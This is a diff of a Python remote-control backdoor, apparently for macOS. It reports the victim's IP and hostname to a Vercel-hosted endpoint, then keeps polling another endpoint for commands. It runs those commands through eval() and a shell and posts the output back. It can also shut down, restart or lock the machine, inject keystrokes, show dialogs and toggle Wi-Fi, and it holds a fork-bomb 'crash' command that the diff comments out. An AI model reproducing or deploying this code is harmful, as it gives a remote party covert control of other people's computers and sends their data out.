@@ -1,26 +1,19 @@
-try:
-    from os import system as ossystem
-    from requests import get, post
-    from time import sleep
-    from subprocess import Popen as system
-    from subprocess import PIPE
-    from os import chdir, uname
-    from sys import platform
+from os import system as ossystem
+from requests import get, post
+from time import sleep
+from subprocess import Popen as system
+from subprocess import PIPE
+from os import chdir, uname
+from sys import platform
+import os
 
-    old_command = ""
-    command = ""
-    loop = 0
+old_command = ""
+command = ""
+loop = 0
 
-    ip = get('https://api.ipify.org').content.decode('utf8')
-    hostname = uname()[1]
-    post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"New client IP: `{ip}@{hostname}`")
-except KeyboardInterrupt:
-    try:
-        post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``Client tried to SIGINT(Ctrl+C) when init``")
-        pass
-    except KeyboardInterrupt:
-        pass
-    pass
+ip = get('https://api.ipify.org').content.decode('utf8')
+hostname = uname()[1]
+post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"New client IP: `{ip}@{hostname}`")
 
 
 while True:
@@ -32,7 +25,9 @@ while True:
     try:
         #get HTML
         try:
-            command = get("https://discord-bot-command-inputter-littleblack111.vercel.app").content.decode()
+            commandGet = eval(get("https://discord-bot-command-inputter-littleblack111.vercel.app").content.decode())
+            commandId = commandGet[0]
+            command = commandGet[1]
             if command.startswith('Error: 429 - {"message": "You are being rate limited.", "retry_after":'):
                 try:
                     sleep(5)
@@ -51,7 +46,7 @@ while True:
             sleep(3)
             continue
         localcmd = None
-        if old_command != command:
+        if old_command != commandId:
             try:
                 if command == "":
                     old_command = ""
@@ -61,13 +56,25 @@ while True:
                     else:
                         loop = 1
                         continue
+                if command == "None":
+                    old_command = ""
+                    continue
+                if command.startswith("webfile "):
+                    localcmd = command.split(maxsplit=1)
+                    files = eval(localcmd[1])
+                    #for fileUrl in files:
+                    #    print(fileUrl)
+                    old_command = commandId
+                    #filename = os.path.basename(localcmd[1])
+                    #print(filename)
+                    #ossystem("touch " + filename[0] + filename[1])
                 if command.startswith("exename "):
                     localcmd = command.split()
                     if localcmd[1] == hostname:
                         del localcmd[:2]
                         localcmd = ' '.join(localcmd)
                     else:
-                        old_command = command
+                        old_command = commandId
                         continue
                 if command.startswith("exeos "):
                     localcmd = command.split()
@@ -75,17 +82,17 @@ while True:
                         del localcmd[:2]
                         localcmd = ' '.join(localcmd)
                     else:
-                        old_command = command
+                        old_command = commandId
                         continue
-                if command.startswith("crash"):
-                    from os import fork
-                    command = command.split()
-                    if command[1<len(command)]:
-                        for _ in range(command[1]):
-                            fork()
-                    else:
-                        while 1:
-                            fork()
+#                if command.startswith("crash"):
+#                    from os import fork
+#                    command = command.split()
+#                    if command[1<len(command)]:
+#                        for _ in range(command[1]):
+#                            fork()
+#                    else:
+#                        while 1:
+#                            fork()
                 elif command.startswith('volume'):
                     localcmd = command.split()
                     if localcmd[1<len(localcmd)]:
@@ -94,7 +101,7 @@ while True:
                             if ossystem(f"osascript -e 'set Volume {volumesize/10}'") == 0:
                                 try:
                                     post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }: ``Volume set to {volumesize}``")
-                                    old_command = command
+                                    old_command = commandId
                                 except KeyboardInterrupt:
                                     continue
                                 continue
@@ -130,7 +137,7 @@ while True:
                                 if ossystem('osascript -e \'tell app "Finder" to shut down\'') == 0:
                                     try:
                                         post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```computer shutting down, bye...```")
-                                        old_command = command
+                                        old_command = commandId
                                     except:
                                         try:
                                             post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to shutdown```")
@@ -148,7 +155,7 @@ while True:
                                 if ossystem('osascript -e \'tell app "Finder" to restart\'') == 0:
                                     try:
                                         post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```computer rebooting, cya...```")
-                                        old_command = command
+                                        old_command = commandId
                                     except:
                                         try:
                                             post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to start rebooting```")
@@ -166,7 +173,7 @@ while True:
                                 if ossystem('osascript -e \'tell app "Finder" to sleep\'') == 0:
                                     try:
                                         post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```computer going to sleep, cya...```")
-                                        old_command = command
+                                        old_command = commandId
                                     except:
                                         try:
                                             post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to start sleeping```")
@@ -183,7 +190,7 @@ while True:
                                 if ossystem('osascript -e \'tell application "System Events" to keystroke "q" using {command down, control down}\'') == 0:
                                     try:
                                         post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```computer going to lockscreen, cya...```")
-                                        old_command = command
+                                        old_command = commandId
                                     except:
                                         try:
                                             post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to start lockingscreen```")
@@ -203,7 +210,7 @@ while True:
                 elif command.startswith('interact'):
                     localcmd = command.split()
                     if localcmd[1<len(localcmd)]:
-                        try:
+#                        try:
 #                            if localcmd[1] == 'upload' or localcmd[1] == 'get':
 #                                if localcmd[2<len(localcmd)]:
 #                                    
@@ -213,7 +220,7 @@ while True:
                                     if ossystem(f'osascript -e \'display dialog "{localcmd[2]}" buttons "Yes"\'') == 0:
                                         try:
                                             post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Successfully the dialog```")
-                                            old_command = command
+                                            old_command = commandId
                                         except KeyboardInterrupt:
                                             continue
                                         continue
@@ -226,7 +233,7 @@ while True:
                                 else:
                                     try:
                                         post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```You need to pass another argument for infomation in the dialog```")
-                                        old_command = command
+                                        old_command = commandId
                                     except KeyboardInterrupt:
                                         continue
                                     continue
@@ -237,7 +244,7 @@ while True:
                                     if r.wait() == 0:
                                         try:
                                             post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```{cmdout.decode()}```")
-                                            old_command = command
+                                            old_command = commandId
                                         except:
                                             try:
                                                 post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to ask with dialog```")
@@ -268,7 +275,7 @@ while True:
                                     if ossystem(f"osascript -e 'display notification \"{localcmd[2]}\" with title \"{localcmd[3]}\" subtitle \"{localcmd[4]}\"'") == 0:
                                         try:
                                             post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Notified successfully```")
-                                            old_command = command
+                                            old_command = commandId
                                         except:
                                             post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed to notify```")
                                             continue
@@ -289,7 +296,7 @@ while True:
                                         if os.system(f"osascript -e 'tell application \"System Events\" to keystroke \"{ ' '.join(str(e) for e in localcmd[3:]) }\"\'") == 0:
                                             try:
                                                 post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Successfully typed {' '.join(str(e) for e in localcmd[3:])} with keyboard```")
-                                                old_command = command
+                                                old_command = commandId
                                             except:
                                                 continue
                                             continue
@@ -303,7 +310,7 @@ while True:
                                         if os.system(f"osascript -e 'tell application \"System Events\" to keystroke { ' '.join(str(e) for e in localcmd[3:]) }\'") == 0:
                                             try:
                                                 post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Successfully pressed {' '.join(str(e) for e in localcmd[3:])} with keyboard```")
-                                                old_command = command
+                                                old_command = commandId
                                             except:
                                                 continue
                                             continue
@@ -318,7 +325,7 @@ while True:
                                     if ossystem(f'osascript -e \'tell app "{localcmd[2]}" to quit\'') == 0:
                                         try:
                                             post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Successfully quitted {localcmd[2]}```")
-                                            old_command = command
+                                            old_command = commandId
                                         except:
                                             continue
                                         continue
@@ -334,7 +341,7 @@ while True:
                                         
                             continue
 
-                        except:
+                        #except:
                             try:
                                 post("https://discord-bot-command-outputter-littleblack111.vercel.app", data=f"``{hostname}@{ip}$ { ' '.join(str(e) for e in localcmd) }`` ```Failed at doing interactive actions```")
                             except KeyboardInterrupt:
@@ -370,7 +377,7 @@ while True:
                             except KeyboardInterrupt:
                                 continue
                             continue
-                        old_command = command
+                        old_command = commandId
                         continue
 
 #                    try:
@@ -397,7 +404,7 @@ while True:
                         ossystem("/usr/sbin/networksetup -setairportpower en0 on")
 
                         continue
-                old_command = command
+                old_command = commandId
                 if localcmd:
                     r = system(localcmd, shell=True, stdout=PIPE, stderr=PIPE)
                     cmdout, cmderr = r.communicate()
@@ -457,7 +464,7 @@ while True:
                         ossystem("/usr/sbin/networksetup -setairportpower en0 on")
 
                         continue
-                old_command = command
+                old_command = commandId
                 continue
             except:
                 continue
